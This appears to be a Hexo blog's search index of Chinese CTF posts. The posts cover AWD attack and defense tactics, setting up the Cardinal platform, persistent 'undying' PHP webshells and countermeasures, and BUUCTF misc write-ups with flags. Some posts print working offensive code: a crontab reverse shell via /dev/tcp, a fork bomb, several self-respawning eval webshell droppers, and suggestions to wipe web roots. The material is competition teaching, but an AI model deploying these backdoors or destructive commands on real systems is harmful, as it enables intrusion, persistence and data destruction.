<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AWD攻击与防御</title>
    <url>/awd/AWD%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1.html</url>
    <content><![CDATA[<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>如果官方没公开靶机地址（通常不会给），则攻击手首先要做的事就是先找到每个主机地址和端口</p>
<p>用工具或者自己的脚本都行，不过建议提前准备好脚本，现场写会慢一点可能还会出问题</p>
<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p><strong>ssh弱口令</strong><br>可能会有些队伍没有改</p>
<p><strong>web弱口令</strong><br>一般在后台登录处，或者phpmyadmin之类的服务</p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计是攻防一体的工作，当发现漏洞时，进攻的同时跟防守的队友商讨如何修复</p>
<p><strong>预留后门</strong><br>某些地市级awd比赛为了降低难度一般会设置一句话木马，注意第一时间删除然后用脚本去批量打其他主机</p>
<p><strong>其他漏洞</strong></p>
<p>将源码下载到本地，先用D盾或者河马等扫描工具大概扫描下，在深入挖掘漏洞</p>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><strong>不死马</strong></p>
<p>参考文章：<a href="https://www.lewiserii.top/awd/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95.html">AWD不死马与克制方法</a></p>
<p><strong>内核漏洞提权</strong></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">https://github.com/The-Z-Labs/linux-exploit-suggester<br></code></pre></td></tr></table></figure>

<p><strong>crontab写定时任务</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//每分钟反弹shell到 127.0.0.1的5353端口<br>(crontab -l;<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;* * * * * /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/5353 0&gt;&amp;1&#x27;\n&quot;</span>)|crontab -<br></code></pre></td></tr></table></figure>



<h2 id="搅屎"><a href="#搅屎" class="headerlink" title="搅屎"></a>搅屎</h2><p>1：到最后一轮时，该拿完的flag拿到时可以进行删站，无限复制等操作</p>
<p>2：fork炸弹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##!/bin/sh</span><br>/bin/echo <span class="hljs-string">&#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27;</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;<br></code></pre></td></tr></table></figure>

<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="web防御"><a href="#web防御" class="headerlink" title="web防御"></a>web防御</h2><h4 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h4><p>ssh命令登录或者使用图形化工具连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//ssh连接<br>ssh -p 2222 ctf@xx.xx.xx.xx<br><br>//免密登录<br>ssh-copy-id -i ~/.ssh/id_rsa.pub ctf@xx.xx.xx.xx<br></code></pre></td></tr></table></figure>


<h4 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h4><p>比赛一开始就需要有一个队友对网站源码和数据库数据进行备份，如果后续被删站了可以及时恢复</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##网址备份</span><br>tar -zcvf web.tar.gz /var/www/html<br><br><span class="hljs-comment">##数据库备份-全部数据</span><br>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql<br><span class="hljs-comment">##数据库备份-指定数据库和表</span><br>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql<br><span class="hljs-comment">##数据库恢复（mysql终端下执行）</span><br><span class="hljs-built_in">source</span> /tmp/db.sql<br></code></pre></td></tr></table></figure>



<h4 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h4><p><strong>ssh密码</strong><br>如果发现拿到的ssh密码不是类似于<code>SDs2dKJaH5hs</code>的随机强口令，而是类似于<code>ctf/123456</code>，则需要更改ssh密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">passwd<br></code></pre></td></tr></table></figure>

<p><strong>web后台密码</strong><br>一般题目大概率是一个cms或者自己写的网站，那么后台就有可能存在弱口令，需要修改</p>
<p><strong>mysql密码</strong><br>mysql密码是很多队伍会忽略的地方，当然也同样重要。改完要注意cms中的配置文件，不然可能会导致cms连不上数据库而崩溃</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##方法一（mysql终端下执行）</span><br>show databases;<br>use mysql<br><span class="hljs-built_in">set</span> password <span class="hljs-keyword">for</span> root@localhost = password(<span class="hljs-string">&#x27;123&#x27;</span>);<br><br><span class="hljs-comment">##方法二（mysql终端下执行）</span><br>update user <span class="hljs-built_in">set</span> password = PASSWORD(<span class="hljs-string">&#x27;需要更换的密码&#x27;</span>) <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span>;<br>flush privileges;<br>show tables;<br><br><span class="hljs-comment">##方法三</span><br>mysqladmin -u用户名 -p旧密码 password 新密码<br></code></pre></td></tr></table></figure>



<h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>一般先用D盾，河马等工具扫一遍，发现一句话木马等较明显的漏洞，再用seay等或手动分析，或者可以找找历史漏洞cve等</p>
<p>找到漏洞后根据漏洞的种类进行修复</p>
<p>1：删站<br>不建议。如果参赛手册中没有明确禁止，这是最简单粗暴的姿势</p>
<p>2：删页面<br>只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等</p>
<p>3：破坏正常功能<br>如果手册中规定了不能删除任何页面，则可以让这些漏洞点的功能函数失效</p>
<p>4：正常修补手段<br>如加白名单，字符过滤转义，设置open_basedir等，有权限还可以修改php.ini，改完记得重启</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">;禁用危险函数<br>disable_functions = exec,system,shell_exec,popen,passthru,pcntl_exec,phpinfo<br><br>;预防sql注入<br>magic_quotes_gpc = on<br><br>;远程文件包含<br>allow_url_fopen = off<br>allow_url_include = off<br><br>;重启php服务<br>service php-fpm restart<br></code></pre></td></tr></table></figure>



<h4 id="上waf"><a href="#上waf" class="headerlink" title="上waf"></a>上waf</h4><p>waf也是比较重要的一点。一般可以分为两个类型，一种是只有监控的功能，可以监控流量方便分析其他队的payload，一般比赛的检查都能通过。另一种就是带拦截的防御waf，也称通防，一般比赛不允许使用</p>
<p>几个waf项目</p>
<p>1：AoiAWD<br>安恒维护的开源项目，需要提前在本机编译，支持web，pwn流量捕获，系统进程监控等<br>地址：<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></p>
<p>2：watchbird<br>通防waf，支持流量转发和替换flag，防御注入，反序列化，rce等漏洞<br>地址：<a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a></p>
<h4 id="shell查杀"><a href="#shell查杀" class="headerlink" title="shell查杀"></a>shell查杀</h4><p>对于不死马可以参考我以前写的一篇文章：<a href="https://www.lewiserii.top/awd/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95.html">AWD不死马与克制方法</a></p>
<p>一些find命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##寻找最近20分钟修改过的文件</span><br>find /var/www/html -name *.php -mmin -20<br><br><span class="hljs-comment">##寻找行数最短的文件</span><br>find ./ -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs <span class="hljs-built_in">wc</span> -l | <span class="hljs-built_in">sort</span> -rg<br><br><span class="hljs-comment">##关键字查杀</span><br>find . -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="hljs-string">&#x27;eval(&#x27;</span><br></code></pre></td></tr></table></figure>


<p>查看进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">netstat -nlpt<br>ps -<span class="hljs-built_in">df</span><br>top<br></code></pre></td></tr></table></figure>

<p>杀死进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -9 PID<br>killall 名称<br></code></pre></td></tr></table></figure>


<h4 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h4><p>经过实践，发现别名似乎在网站上rce执行命令时并不会生效</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##修改cat的别名</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">&quot;echo `date`|md5sum|cut -d &#x27; &#x27; -f1||&quot;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">&quot;printf &#x27;flag&#123;%s&#125;&#x27; <span class="hljs-subst">$(date | md5sum | cut -d &#x27; &#x27; -f1)</span>&quot;</span><br><br><br><span class="hljs-comment">##去除别名</span><br><span class="hljs-built_in">unalias</span> -a<br></code></pre></td></tr></table></figure>




<h2 id="pwn防御"><a href="#pwn防御" class="headerlink" title="pwn防御"></a>pwn防御</h2><h4 id="打patch"><a href="#打patch" class="headerlink" title="打patch"></a>打patch</h4><p>参考：<a href="https://q1iq.top/IDA-patch">https://q1iq.top/IDA-patch</a></p>
<h4 id="上通防"><a href="#上通防" class="headerlink" title="上通防"></a>上通防</h4><p>现在大部分比赛不允许上通防，因为通防基本可以实现完美防御</p>
<p>通防是通用防御的简称。因为awd里pwn题的形式基本都是运行一个二进制，然后把二进制的流量转发到某个端口，所以如果给这个pwn题加个壳子过滤一下流量，所有带flag的字符串都不允许输出，所有带flag的文件都不允许打开，基本上就没办法攻击了。</p>
<p>以下是几个通防项目</p>
<p><a href="https://github.com/rip1s/PwnSandboxForCTF">PwnSandboxForCTF</a>：Ptrace，劫持敏感syscall，检查参数过滤敏感字符串</p>
<p><a href="https://github.com/TTY-flag/evilPatcher">evilPatcher</a>：Seccomp沙盒，劫持syscall，无法过滤指针类参数</p>
<p><a href="https://github.com/I0gan/pwn_waf">pwn_waf</a>：抓取流量、通防、转发、多人转发模式，</p>
<p><a href="https://lief-project.github.io/download/">LIEF</a>：劫持敏感函数调用，过滤敏感字符串等。对原文件改动较小</p>
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>Cardinal平台部署</title>
    <url>/awd/Cardinal%E9%83%A8%E7%BD%B2.html</url>
    <content><![CDATA[<h1 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h1><p>如果是团队内部局域网比赛一个虚拟机就够用了，甚至靶机都可以部署在同一台上，文中虚拟机为centos7<br>平台本身可以不需要docker，但靶机大部分需要docker环境，文中docker版本为20.10.9<br>还需要有一个数据库来存数据，这里用到是mysql</p>
<h1 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h1><p>安装mysql<br><code>yum -y install mariadb-server mariadb</code><br>设置mysql开机自启动和启动mysql<br><code>systemctl start mariadb &amp;&amp; systemctl enable mariadb</code><br>设置mysql root用户密码<br><code>mysqladmin -u root password 123456</code><br>进入数据库<br><code>mysql -u root -p123456</code><br>创建数据库，注意编码<br><code>create database `cardinal` default character set utf8mb4 collate utf8mb4_unicode_ci;</code></p>
<h1 id="安装Cardinal"><a href="#安装Cardinal" class="headerlink" title="安装Cardinal"></a>安装Cardinal</h1><p>首先<a href="https://github.com/vidar-team/Cardinal/releases">下载</a>对应的安装包<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-2.jpg"></p>
<p>解压<br><code>tar -zxvf Cardinal_v0.7.3_linux_amd64.tar.gz</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-3.jpg"></p>
<p>运行<br><code>./Cardinal</code><br>如果没有权限需要添加执行权限<code>chmod +x ./Cardinal</code></p>
<h1 id="Cardinal配置"><a href="#Cardinal配置" class="headerlink" title="Cardinal配置"></a>Cardinal配置</h1><p>根据提示来即可<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-4.jpg"></p>
<p>管理地址<br><code>http://ip:port/manager/</code></p>
<h1 id="靶机配置"><a href="#靶机配置" class="headerlink" title="靶机配置"></a>靶机配置</h1><p>找个docker-awd靶机<br>这里以<code>glzjin/20190511_awd_docker_b4</code>为例子</p>
<p>下载靶机<br><code>docker pull glzjin/20190511_awd_docker_b4</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-5.jpg"></p>
<p>以三个队伍（lewiserii,rot,whatisup）为例<br>创建三个靶机<br>分别开放80和22端口<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-6.jpg"></p>
<h1 id="比赛前题目配置"><a href="#比赛前题目配置" class="headerlink" title="比赛前题目配置"></a>比赛前题目配置</h1><p>先添加三个队伍<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-7.jpg"></p>
<p>创建题目<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-8.jpg"></p>
<p>添加靶机，注意ssh是root，因为没权限会写不进flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-9.jpg"></p>
<p>生成flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-10.jpg"></p>
<p>更改靶机root密码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-11.jpg"></p>
<p>写入flag和验证靶机<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-12.jpg"></p>
<h1 id="开始比赛"><a href="#开始比赛" class="headerlink" title="开始比赛"></a>开始比赛</h1><p>选手用事先定义的账号密码登录<code>http://ip:port</code>即可<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Cardinal-13.png"></p>
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>平台</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>AWD不死马与克制方法</title>
    <url>/awd/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95.html</url>
    <content><![CDATA[<h1 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h1><p>一个典型的不死马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.l.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;56183c1f36ef08fb8b027a4116db8483&quot;)&#123;@eval($_POST[&quot;a&quot;]);&#125; ?&gt;&#x27;</span>;<br>    <span class="hljs-comment">//pass=lewiserii</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .l.php&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>解释一下<br><code>ignore_user_abort(true);</code> 忽略与用户的断开，即使与客户机断开脚本仍会执行。<br><code>set_time_limit(0);</code> 设置脚本最大执行时间，这里设置为0，即没有时间方面的限制<br><code>unlink(__FILE__);</code> 删除文件本身，以起到隐蔽自身的作用</p>
<p>当上传完后需要访问一次不死马，生成一句话木马, 才能真正”不死”，这点很多新手第一次用可能会忽略，还有记得删除注释，不然就会被其他队乌鸦坐飞机</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/awd%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95-1.png"></p>
<h1 id="克制方法"><a href="#克制方法" class="headerlink" title="克制方法"></a>克制方法</h1><p>当然，不死马也并非真正无敌，只是在低权限的情况下较难处理</p>
<h2 id="高权限下的处理方法（root）"><a href="#高权限下的处理方法（root）" class="headerlink" title="高权限下的处理方法（root）"></a>高权限下的处理方法（root）</h2><p>1：重启服务，杀掉不死马的进程<br>ubuntu的用service，centos的用systemctl<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/awd%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95-2.png"></p>
<h2 id="低权限下的处理方法"><a href="#低权限下的处理方法" class="headerlink" title="低权限下的处理方法"></a>低权限下的处理方法</h2><p>一般的awd比赛中基本不会放出root，所以我们的权限很低，无法进行重启服务等操作</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/awd%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95-3.png"></p>
<p>不过办法总比困难多</p>
<p>方法一：kill进程</p>
<p>这个方法应该是目前最好的解决方案了，新建一个文件，比如<code>del.php</code>, 写上杀进程的命令，访问后即可删除不死马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">www-data         <span class="hljs-comment">//使用的时候注意用户不一定是www-data，根据实际情况来</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;kill `ps aux | grep www-data | awk &#x27;&#123;print <span class="hljs-subst">$2</span>&#125;&#x27; | xargs kill -9`&quot;</span>);<br><br>php-fpm        <span class="hljs-comment">//杀php-fpm进程</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;kill `ps -ef | grep php-fpm | grep -v grep | awk &#x27;&#123;print <span class="hljs-subst">$2</span>&#125;&#x27;`&quot;</span>);<br><br>php-apache     <span class="hljs-comment">//杀httpd进程</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;kill `ps -ef | grep httpd | grep -v grep | awk &#x27;&#123;print <span class="hljs-subst">$2</span>&#125;&#x27;`&quot;</span>);<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/awd%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95-4.png"></p>
<p>方法二：创建一个和不死马生成的马一样名字的目录<br>对自己的防御不放心的话可以提前创建几个常用马名字的文件夹，比如m.php，shell.php</p>
<p>编写一个shell脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>cd /var/www/html/<br>while true;do rm -rf .l.php;mkdir .l.php;done<br></code></pre></td></tr></table></figure>
<p>放在后台运行，实测不是很稳定，不推荐使用</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/awd%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95-5.png"></p>
<p>方法三：竞争写入无意义的一句话<br>usleep值比对方马的值低就行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.l.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php echo &quot;lewiserii&quot; ?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-comment">//system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .l.php&#x27;);</span><br>        <span class="hljs-comment">//usleep(1000);</span><br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>


<h1 id="变种不死马与搅屎棍"><a href="#变种不死马与搅屎棍" class="headerlink" title="变种不死马与搅屎棍"></a>变种不死马与搅屎棍</h1><p>唯一的区别是文件名前加了个短杠，这就很骚了，会与命令的参数冲突而无法对它操作，但是浏览器中却可以正常解析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;-index.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;56183c1f36ef08fb8b027a4116db8483&quot;)&#123;@eval($_POST[&quot;a&quot;]);&#125; ?&gt;&#x27;</span>;<br>    <span class="hljs-comment">//pass=lewiserii</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-comment">//system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; -index.php&#x27;);</span><br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/awd%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95-6.png"></p>
<p>这个应该算是比较冷门的知识点了，想要操作也很简单，在文件前加上两个<code>--</code>就可以了，表示转义字符，或者形如<code>./-index.php</code></p>
<blockquote>
<p>搅屎棍：在不死马中添加<code>rm -rf /var/www/html/*</code>；或者创建大量无意义的文件；或者制作fork炸弹等等</p>
</blockquote>
<h2 id="动态密码"><a href="#动态密码" class="headerlink" title="动态密码"></a>动态密码</h2><p>php获取SERVER_ADDR的值进行md5</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;-lewiserii.php&#x27;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>];<br><span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$ip</span>);<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_REQUEST[&quot;pass&quot;])==&quot;&#x27;</span> . <span class="hljs-variable">$pass</span> . <span class="hljs-string">&#x27;&quot;)&#123;@eval($_REQUEST[&quot;cmd&quot;]);&#125; ?&gt;&#x27;</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; ./-lewiserii.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">500</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>但是也有缺点，因为密码是明文传输，很容易反应过来然后上车<br>其实更好的方式是利用python等脚本在本地加密完再传到靶机</p>
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>不死马</tag>
      </tags>
  </entry>
  <entry>
    <title>awd工具开发</title>
    <url>/awd/awd%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="5ae017b1f5d410795bfd9739750554905d01916611c48e80022de5e4979a6b6d">c37edc3dc388221caed397fda20028d37f56e9260e95a553f9e4a07c31a28dfbd6e28959ec8851bd44bca72f4c99fed2e3f2d59cf04f91230bf3fdfe87e3b692ed77a7893f19a317aa20db4289c8a89ebb1d608df2ea9fdd7a6449972732634f822b471416b98cf454c3ec2eda8a1dec</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>自动化工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【buuctf】misc-page1</title>
    <url>/buuctf/%E3%80%90buuctf%E3%80%91misc-page1.html</url>
    <content><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><blockquote>
<p>flag{buu_ctf}</p>
</blockquote>
<h1 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h1><p>gif文件，使用<code>stegsolve</code>逐帧查看，分别在第21，51，79帧出现了三段flag，拼接起来</p>
<blockquote>
<p>flag{he11ohongke}</p>
</blockquote>
<h1 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h1><p>解压得到一张二维码，解码得到<code>secret is here</code><br>十六进制形式下观察发现<code>50 4b 03 04</code>，即压缩包的头<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page1-1.png"></p>
<p>可以将后缀直接改为zip解压，这样可以不用先分离文件<br>打开后发现需要密码，而压缩包中的文件名为<code>4number.txt</code>，这样就很明显了，是4位数字爆破</p>
<p>使用<code>archpr</code>爆破得到密码<code>7639</code></p>
<blockquote>
<p>flag{vjpw_wnoei}</p>
</blockquote>
<h1 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h1><p>在文件尾直接得到flag</p>
<blockquote>
<p>flag{stego_is_s0_bor1ing}</p>
</blockquote>
<h1 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h1><p>解压得到一个<code>KEY.exe</code>，以文本形式查看，可以看到实际上是一个base64后的图片<br>解码后得到一张二维码，扫码得到</p>
<blockquote>
<p>flag{dca57f966e4e4e31fd5b15417da63269}</p>
</blockquote>
<h1 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h1><p>图片放入<code>010 editor</code>会报<code>IHDR块CRC</code>错误，大概率是高宽被修改了</p>
<p>修改成较大的值<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page1-2.png"></p>
<blockquote>
<p>flag{He1l0_d4_ba1}</p>
</blockquote>
<h1 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h1><p>根据提示进行四位数字暴力破解，得到密码<code>2563</code><br>解压后对内容base64解码</p>
<blockquote>
<p>flag{70354300a5100ba78068805661b93a5c}</p>
</blockquote>
<h1 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h1><p>文件尾</p>
<blockquote>
<p>flag{97314e7864a8f62627b26f3f998c37f1}</p>
</blockquote>
